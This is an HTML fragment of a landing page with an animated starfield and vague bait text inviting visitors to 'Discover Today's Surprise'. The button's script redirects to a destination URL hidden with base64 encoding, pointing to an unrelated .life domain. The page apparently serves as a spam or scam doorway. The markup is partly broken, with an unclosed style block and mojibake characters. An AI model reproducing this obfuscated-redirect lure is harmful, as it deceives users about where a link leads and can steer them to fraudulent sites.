  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    html,body{width:100%;height:100%;background:#000;color:#fff;font-family:sans-serif;overflow:hidden;}
    canvas{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:-1;}
    .container{position:relative;width:100%;height:100%;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;z-index:1;padding:20px;}
    h1{font-size:2em;margin-bottom:0.8em;}

    .btn:active{transform:scale(.95);opacity:.8;}

<body>
  <canvas id="stars"></canvas>
  <div class="container">
    <h1 id="title">ðŸŒŸ Explore Corner</h1>
    <p id="desc">Looking for something light and fun? This might be a perfect fit.</p>
    <button class="btn" id="btn">ðŸš€ Discover Today's Surprise</button>
  </div>

  <script src="langs.js"></script>
  <script>
    const userLang = (navigator.language || "en").toLowerCase();
    let key = Object.keys(texts).find(k=> userLang.startsWith(k));
    if (!key || !texts[key]) key = "en";
    const t = texts[key];
    document.getElementById("title").textContent = t.title;
    document.getElementById("desc").textContent = t.lines[0];
    document.getElementById("btn").textContent = t.btn;

    document.getElementById("btn").onclick = () => {
      location.href = atob('aHR0cHM6Ly8xd2lic3AubGlmZS92My8zMzE2L21vdGl2ZS12aXRleS1wZXJtw==');
    };

    // æ˜Ÿå°˜èƒŒæ™¯
    const canvas = document.getElementById('stars'), ctx = canvas.getContext('2d');
    function resize(){canvas.width = innerWidth; canvas.height = innerHeight;}
    window.addEventListener('resize', resize);
    resize();
    const stars = Array.from({length:100},()=>({
      x:Math.random()*canvas.width,
      y:Math.random()*canvas.height,
      r:Math.random()*1.5+0.3,
      vx:(Math.random()-0.5)*0.4,
      vy:(Math.random()-0.5)*0.4
    }));
    function animate(){
      ctx.clearRect(0,0,canvas.width,canvas.height);
      ctx.fillStyle = 'rgba(255,255,255,0.8)';
      stars.forEach(s=>{
        ctx.beginPath(); ctx.arc(s.x,s.y,s.r,0,2*Math.PI); ctx.fill();
        s.x += s.vx; s.y += s.vy;
        if(s.x<0||s.x>canvas.width) s.vx*=-1;
        if(s.y<0||s.y>canvas.height) s.vy*=-1;
      });
      requestAnimationFrame(animate);
    }
    animate();
  </script>
</body>
